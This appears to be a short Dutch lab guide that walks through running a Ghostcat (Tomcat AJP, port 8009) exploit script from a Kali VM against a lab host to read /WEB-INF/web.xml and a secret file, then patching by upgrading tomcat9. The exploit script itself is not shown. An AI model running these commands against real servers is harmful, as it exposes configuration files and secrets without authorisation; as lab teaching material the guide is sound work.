# 4) Starten van de aanval

## 1) Stappen om de aanval succesvol uit te voeren (Kali VM)

- open terminal in kali vm
- voer volgende commando's uit:
- 4.1) sudo cp /media/sf_kali/exploit_ghostcat.py ~/Desktop/
- 4.2) cd Desktop
- 4.3) sudo chmod +x exploit_ghostcat.py
- 4.4) nmap 10.10.10.4 -p 8009
- 4.5) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
- 4.6) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read

# 5) Voorkomen van de kwetsbaarheid

- open terminal in ubuntu vm
- voer volgende commando's uit:
- 5.1) sudo apt update && sudo apt upgrade tomcat9
